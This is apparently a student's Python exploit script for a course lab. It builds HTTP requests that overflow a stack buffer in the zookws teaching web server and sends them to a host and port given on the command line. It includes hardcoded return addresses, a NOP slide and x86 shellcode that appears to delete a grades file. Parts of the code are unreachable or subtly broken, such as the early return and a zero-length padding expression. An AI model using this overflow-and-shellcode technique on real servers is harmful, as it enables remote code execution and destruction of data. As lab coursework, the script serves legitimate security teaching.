#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xdeadc0de
stack_saved_ebp = 0xdeadc0de
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):

    # url = "answers.txt"
    # req =  "GET /%s HTTP/1.0\r\n" % (url)
    # overflow_header = "Accept: " + "a"*4100 + "\r\n"
    # req += overflow_header 
    num = 900 + 27 * 4 + 50 
    # system_func_address = 
    req =  "GET /answers.txt/%s HTTP/1.0\r\n\r\n"  % ("a"*num)
    return req

    ## TODO: EXPLOIT
    ## buf = 0xbfea8a50, 4096 bytes buffer passed over to http_read_line function
    ## http_read_line ebp = 0xbfea8a38
    ## http_request_line ebp = 0xbfea9a68
    pos_http_request_line_ebp = chr(0xd8) + chr(0xdd) + chr(0xff) + chr(0xbf)
    nop_slide = chr(0x90)

    ########################################
    # url = "answers.txt"
    # queryString = "?q&cp=0&client=psy-ab&xssi=t&gs_ri=gws-wiz&hl=en-IN&authuser=0&pq=view%20raw%20headers%20chrome&psi=HpaWXIC9PNGSwgOh9rvgCg.1553372704027&ei=HpaWXIC9PNGSwgOh9rvgCg" 
    # # queryString = "/zoobar/index.cgi/login?nexturl=http://192.168.56.3:8080/zoobar/index.cgi/" 
    # headers = [
            # "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"
            # ]
    # raw_headers = [i + "\r\n" for i in headers]
    # req =  "GET /%s%s HTTP/1.0\r\n" % (url, queryString)
    # for i in raw_headers: 
        # req += i
    # overflow_header = "Accept: " + "a"*4100 + "\r\n"
    # req += overflow_header 
    ########################################

    ########################################
    # Crafting for the case when we have to corrupt memory of a data structure and use that for exploitation
    # url = "/zoobar/index.cgi/login?nexturl=http://localhost:8080/zoobar/index.cgi/" 
    # headers = [
            # "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36",
            # "Host: localhost:8080",
            # "Accept: */*"
            # ]
    # raw_headers = [i + "\r\n" for i in headers]
    # req =  "GET /%s HTTP/1.0\r\n" % (url)
    # for i in raw_headers: 
        # req += i
    ########################################


    ########################################
    # url = "/" + "a"*2050 
    # req =  "GET %s HTTP/1.0\r\n" % (url)
    ########################################

    nop_slide = "\x90"*4
    pos_eip_shellcode_addr = "\xe0\xdd\xff\xbf"
    shellcode = "\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x61\x64\x65\x73\x68\x2f\x2f\x67\x72\x68\x74\x70\x64\x2f\x68\x65\x2f\x68\x74\x68\x2f\x68\x6f\x6d\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\x04\xff\xcd\x80"
    shellcode = nop_slide + pos_eip_shellcode_addr + shellcode
    req =  "GET%s /%s HTTP/1.0\r\n" % (''*4115, shellcode)
    req += "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

